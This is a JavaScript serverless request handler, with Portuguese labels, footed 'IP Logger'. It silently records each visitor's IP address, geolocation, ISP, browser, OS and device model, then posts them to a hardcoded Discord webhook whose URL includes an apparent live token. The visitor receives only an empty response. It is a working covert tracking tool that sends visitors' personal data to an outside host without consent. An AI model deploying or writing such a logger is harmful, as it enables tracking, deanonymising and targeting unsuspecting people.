export default async function handler(req, res) {
  const webhookUrl = "https://discord.com/api/webhooks/1377330816664731709/bl_oh9S8js6rhNgBNMmqSplQc7f__4dde322QGU-qSnq-VzQVvjQ_JwRjwDDQX2SDa6I";

  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

  const geoRes = await fetch(`https://ipwho.is/${ip}`);
  const geoData = await geoRes.json();

  const country = geoData.country || "Desconhecido";
  const countryCode = geoData.country_code || "Desconhecido";
  const city = geoData.city || "Desconhecido";
  const region = geoData.region || "Desconhecido";
  const isp = geoData.connection?.isp || "Desconhecido";
  const domain = geoData.connection?.domain || "Desconhecido";

  const userAgent = req.headers["user-agent"] || "Desconhecido";

  let model = "Desconhecido";
  let browser = "Desconhecido";
  let os = "Desconhecido";
  let deviceType = "Desconhecido";

  try {
    const response = await fetch(`https://api.useragentapi.com/v4/json/useragent?ua=${encodeURIComponent(userAgent)}`);
    const data = await response.json();

    if (data && data.device) {
      model = data.device.model || model;
      deviceType = data.device.type || deviceType;
    }
    if (data && data.browser) {
      browser = data.browser.name || browser;
    }
    if (data && data.os) {
      os = data.os.name || os;
    }
  } catch (err) {
    // Erro na requisição, deixa valores padrões
  }

  const embed = {
    embeds: [
      {
        title: "🖥 Novo usuário acessou o site",
        color: 375295,
        description: `
**🌐 Informações de IP**
> **Endereço de IP:** \`${ip}\`
> **País:** ${country}
> **Código do País:** ${countryCode}
> **Cidade:** ${city}
> **Região:** ${region}
> **Provedor:** ${isp}
> **Domínio do Provedor:** \`${domain}\`

**🧠 Informações do Navegador e Dispositivo**
> **User Agent:** \`${userAgent}\`
> **Navegador:** ${browser}
> **Sistema Operacional:** ${os}
> **Tipo de Dispositivo:** ${deviceType}
> **Modelo:** ${model}
        `,
        footer: { text: "IP Logger" },
        timestamp: new Date().toISOString()
      }
    ]
  };

  await fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(embed),
  });

  res.status(200).end();
}
